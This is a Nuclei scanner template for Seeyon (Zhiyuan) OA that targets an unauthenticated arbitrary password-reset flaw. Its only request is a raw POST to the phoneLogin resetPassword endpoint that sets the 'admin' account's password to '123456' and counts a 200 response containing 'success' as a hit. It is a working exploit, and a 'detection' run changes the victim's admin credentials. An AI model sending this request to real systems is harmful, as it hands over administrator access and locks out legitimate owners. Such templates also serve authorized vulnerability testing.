id: zhiyuanOA-qiantai-pass-reset
info:
  name: 致远OA前台任意用户密码修改漏洞
  author: cnaq
  severity: high  
  description: 致远OA前台任意用户密码修改漏洞
  reference: 
    - https://github.com/wy876/POC/blob/main/%E8%87%B4%E8%BF%9COA%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E.md
  tags: zhiyuanOA,info,leak

requests:
  - raw:
      - |
        POST /seeyon/rest/phoneLogin/phoneCode/resetPassword HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Content-Length: 24
        Content-Type: application/json
        Accept-Encoding: gzip

        {"loginName":"admin","password":"123456"}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          
      - type: word
        part: body
        words:
          - 'success'


